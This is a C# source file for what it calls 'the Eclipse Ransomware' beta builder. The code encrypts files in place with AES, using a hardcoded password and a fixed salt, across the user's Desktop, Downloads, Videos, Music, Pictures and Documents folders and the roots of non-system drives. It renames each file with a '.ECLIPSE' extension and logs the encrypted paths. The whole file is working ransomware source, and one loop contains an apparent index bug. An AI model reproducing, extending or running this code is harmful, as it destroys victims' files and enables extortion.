using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Eclipse;

internal class encryption
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public static string note;

	public static string password;

	public static string extension = ".ECLIPSE";

	public static void encryptdrives()
	{
		EncryptionFile encryptionFile = new EncryptionFile();
		Console.WriteLine("Detecting drives....");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady || !(driveInfo.Name != "C:\\"))
			{
				continue;
			}
			try
			{
				string[] files = Directory.GetFiles(driveInfo.Name, "*");
				Console.WriteLine("Detected " + driveInfo.Name);
				for (int j = 0; j < files.Length; j++)
				{
					if (!files[j].EndsWith(extension))
					{
						try
						{
							encryptionFile.EncryptFile(files[j], password);
							File.Move(files[j], files[j] + extension);
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch
			{
			}
		}
	}

	public static void Start()
	{
		note = "This is the Eclipse Ransomware.\n\nThis is a beta ef the builder for it.\n\nJust know this isnt the final version...";
		password = "password123";
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string text5 = Path.Combine(environmentVariable, "Documents");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		string[] files6 = Directory.GetFiles(text5 + "\\", "*", SearchOption.TopDirectoryOnly);
		Task.Run(delegate
		{
			EncryptionFile encryptionFile = new EncryptionFile();
			try
			{
				List<string> list = new List<string>();
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						if (!files[i].EndsWith(extension))
						{
							list.Add("Encrypted: " + files[i]);
							encryptionFile.EncryptFile(files[i], password);
							File.Move(files[i], files[i] + extension);
							Console.WriteLine("Encrypted: " + files[i]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int j = 0; j < files2.Length; j++)
				{
					try
					{
						if (!files2[j].EndsWith(extension))
						{
							list.Add("Encrypted: " + files2[j]);
							encryptionFile.EncryptFile(files2[j], password);
							File.Move(files2[j], files2[j] + extension);
							Console.WriteLine("Encrypted: " + files2[j]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int k = 0; k < files3.Length; k++)
				{
					try
					{
						if (!files3[k].EndsWith(extension))
						{
							list.Add("Encrypted: " + files3[k]);
							encryptionFile.EncryptFile(files3[k], password);
							File.Move(files3[k], files3[k] + extension);
							Console.WriteLine("Encrypted: " + files3[k]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int l = 0; l < files4.Length; l++)
				{
					try
					{
						if (!files4[l].EndsWith(extension))
						{
							list.Add("Encrypted: " + files4[l]);
							encryptionFile.EncryptFile(files4[l], password);
							File.Move(files4[l], files4[l] + extension);
							Console.WriteLine("Encrypted: " + files4[l]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int m = 0; m < files5.Length; m++)
				{
					try
					{
						if (!files5[m].EndsWith(extension))
						{
							list.Add("Encrypted: " + files5[m]);
							encryptionFile.EncryptFile(files5[m], password);
							File.Move(files5[m], files5[m] + extension);
							Console.WriteLine("Encrypted: " + files5[m]);
						}
					}
					catch (Exception)
					{
					}
				}
				for (int n = 0; n < files6.Length; n++)
				{
					try
					{
						if (!files5[n].EndsWith(extension))
						{
							list.Add("Encrypted: " + files6[n]);
							encryptionFile.EncryptFile(files6[n], password);
							File.Move(files6[n], files6[n] + extension);
							Console.WriteLine("Encrypted: " + files6[n]);
						}
					}
					catch (Exception)
					{
					}
				}
				File.WriteAllLines("Eclipsecache.dat", list);
			}
			catch (Exception)
			{
				Console.WriteLine("Could not encrypt files");
			}
			encryptdrives();
		});
	}
}
